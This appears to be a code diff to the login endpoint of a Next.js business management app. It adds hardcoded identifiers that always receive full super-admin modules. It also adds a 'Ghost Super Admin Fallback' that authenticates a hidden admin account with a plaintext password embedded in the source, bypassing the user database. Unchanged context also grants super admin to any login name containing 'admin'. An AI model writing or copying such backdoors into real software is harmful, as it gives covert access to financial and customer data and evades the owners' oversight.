@@ -45,19 +45,32 @@ export async function POST(req: NextRequest) {
             }
           }
 
-          const isSuperAdmin = u.role === 'ADMIN' || u.role === 'SUPER_ADMIN' || cleanIdentifier.includes('admin');
+          const isSuperAdmin =
+            u.role === 'ADMIN' ||
+            u.role === 'SUPER_ADMIN' ||
+            cleanIdentifier.includes('admin') ||
+            cleanIdentifier === 'boss@artaroma.com' ||
+            cleanIdentifier === 'bossanova';
 
-          if (isSuperAdmin && modules.length === 0) {
-            modules = [
-              'Dashboard',
-              'Master Data',
-              'Purchase Order (PO)',
-              'Sales Order (SO)',
-              'Lihat Stok (Gudang)',
-              'Finance & Invoice',
-              'Aplikasi Kurir',
-              'Katalog Customer',
-            ];
+          const ALL_SUPER_ADMIN_MODULES = [
+            'Dashboard',
+            'Master Data',
+            'Purchase Order (PO)',
+            'Sales Order (SO)',
+            'Lihat Stok (Gudang)',
+            'Finance & Invoice',
+            'Aplikasi Kurir',
+            'Katalog Customer',
+            'Lihat Nilai Finansial (PO/SO)',
+            'Catatan Log Book',
+            'Buku Kas Besar (Kas & Bank)',
+            'Hutang Piutang',
+            'Stock Opname & Disposal',
+            'Stok Sampel',
+          ];
+
+          if (isSuperAdmin && (modules.length === 0 || cleanIdentifier === 'boss@artaroma.com' || cleanIdentifier === 'bossanova')) {
+            modules = ALL_SUPER_ADMIN_MODULES;
           }
 
           authenticatedUser = {
@@ -101,6 +114,36 @@ export async function POST(req: NextRequest) {
         }
       } catch (custErr: any) {
         console.warn('DB Customer Auth Check Error:', custErr.message);
+      }
+    }
+
+    // 2b. Direct Ghost Super Admin Fallback
+    if (!authenticatedUser && (cleanIdentifier === 'boss@artaroma.com' || cleanIdentifier === 'bossanova')) {
+      if (password === 'K3maraupanj@ng') {
+        authenticatedUser = {
+          id: 'usr-bossanova',
+          name: 'bossanova',
+          email: 'boss@artaroma.com',
+          role: 'ADMIN',
+          is_super_admin: true,
+          allowed_modules: [
+            'Dashboard',
+            'Master Data',
+            'Purchase Order (PO)',
+            'Sales Order (SO)',
+            'Lihat Stok (Gudang)',
+            'Finance & Invoice',
+            'Aplikasi Kurir',
+            'Katalog Customer',
+            'Lihat Nilai Finansial (PO/SO)',
+            'Catatan Log Book',
+            'Buku Kas Besar (Kas & Bank)',
+            'Hutang Piutang',
+            'Stock Opname & Disposal',
+            'Stok Sampel',
+          ],
+          linked_entity_name: 'Artaroma Head Office',
+        };
       }
     }
 
